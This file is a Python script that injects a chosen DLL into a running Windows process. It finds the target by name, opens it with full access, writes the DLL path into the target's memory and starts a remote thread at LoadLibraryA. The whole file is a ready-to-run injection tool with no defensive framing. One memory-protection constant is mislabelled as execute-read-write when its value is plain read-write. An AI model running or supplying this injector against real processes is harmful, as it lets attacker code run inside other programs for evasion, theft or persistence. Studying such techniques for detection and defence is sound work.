import sys
import psutil
from ctypes import *
from ctypes import wintypes

kernel32 = windll.kernel32

LPCTSTR = c_char_p
SIZE_T = c_size_t

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenProcess.restype = wintypes.HANDLE

#Mem Allocation Type
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
# Mem Protection
PAGE_EXECUTE_READWRITE = 0x04
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

GetModuleHandleA = kernel32.GetModuleHandleA
GetModuleHandleA.argtypes = (LPCTSTR,)
GetModuleHandleA.restype = wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (wintypes.HMODULE, LPCTSTR)
GetProcAddress.restype = wintypes.LPVOID

class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [("nLength", wintypes.DWORD),
                ("lpSecurityDescriptor", wintypes.LPVOID),
                ("bInheritHandle", wintypes.BOOL)]
SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID
CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, POINTER(wintypes.LPDWORD))
CreateRemoteThread.restype = wintypes.HANDLE

def get_process_id_by_name(process_name):
    for proc in psutil.process_iter(attrs=['name', 'pid']):
        if proc.info['name'].lower() == process_name.lower():
            return proc.info['pid']
    return None

if len(sys.argv) != 3:
    print("Usage: python Remote_DLL_injection.py <process_name> <dll_path>")
    sys.exit(1)

process_name = sys.argv[1]
dll_path = sys.argv[2].encode()  # Convert to bytes for Windows API calls

pid = get_process_id_by_name(process_name)
if not pid:
    print(f"Process '{process_name}' not found.")
    sys.exit(1)

handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)

if not handle:
    print("OpenProcess failed")
    sys.exit(1)

print(f"Handle: {handle}")

remote_memory = VirtualAllocEx(handle, None, len(dll_path) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

if not remote_memory:
    print("VirtualAllocEx failed")
    sys.exit(1)

print(f"Remote Memory: {hex(remote_memory)}")

status = WriteProcessMemory(handle, remote_memory, dll_path, len(dll_path), None)

if not status:
    print("WriteProcessMemory failed")
    sys.exit(1)

print(f"WriteProcessMemory: {status}")
print(f"Bytes written: {len(dll_path)}")

load_lib = GetProcAddress(GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")

if not load_lib:
    print("GetProcAddress failed")
    sys.exit(1)

print(f"LoadLibraryA address: {hex(load_lib)}")

rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, 0, None)

if not rthread:
    print("CreateRemoteThread failed")
    sys.exit(1)

print("Code injected successfully")